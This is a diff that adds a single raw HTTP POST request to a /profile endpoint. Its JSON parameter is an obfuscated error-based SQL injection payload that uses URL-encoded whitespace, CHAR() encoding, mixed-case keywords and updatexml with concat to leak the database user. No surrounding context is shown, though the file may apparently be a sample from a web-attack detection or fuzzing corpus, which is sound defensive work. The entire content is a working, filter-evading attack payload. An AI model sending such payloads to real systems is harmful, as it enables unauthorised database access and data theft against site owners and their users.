@@ -1,0 +1,9 @@
+POST /profile HTTP/1.1
+Host: example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: */*
+Connection: close
+Content-Type: application/json
+Content-Length: 99
+
+{"param": "'%0ACHAR(97,110,100)%0bupdatexmL(1,cOncat(0x7e,User()),1)--%3b%2520SELECT%25201,%25202"}
